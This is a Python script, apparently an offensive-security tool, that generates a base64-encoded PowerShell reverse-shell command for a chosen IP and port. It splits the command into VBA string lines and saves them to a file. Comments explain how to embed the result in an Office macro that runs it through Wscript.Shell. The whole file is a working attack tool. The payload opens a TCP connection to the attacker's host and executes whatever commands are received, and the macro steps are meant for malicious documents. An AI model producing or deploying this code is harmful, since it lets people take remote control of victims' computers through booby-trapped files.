# This script is to encode your PowerShell payload
# Usage: python3 script.py <ip> <port>
# Will generate a PowerShell base64 encoded command to input into a macro file
import sys
import base64

def help():
	print("USAGE: %s IP PORT" % sys.argv[0])
	print("Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT")
	exit()

try:
	(ip, port) = (sys.argv[1], int(sys.argv[2]))
except:
	help()

# Replace the LHOST and LPORT with your IP information
payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
payload = payload % (ip, port)

cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

# Uncomment the below line if you want to see this output, otherwise, refer to payload.txt

# print(cmdline + "\n")

str = cmdline
n=50

# Break it up into maximum string length for VBA
# Saves the output to a file named payload.txt

for i in range(0,len(str),n):
	with open("payload.txt", "a") as f:
		f.write("Str = str+" + '"' + str[i:i+n] + '"\n')
		# Add a new line
		
# Put the output of payload.txt under 'Dim Str As String' under 'Sub MyMacro()'
# Before the end of macro file add 'CreateObject("Wscript.Shell").Run Str'
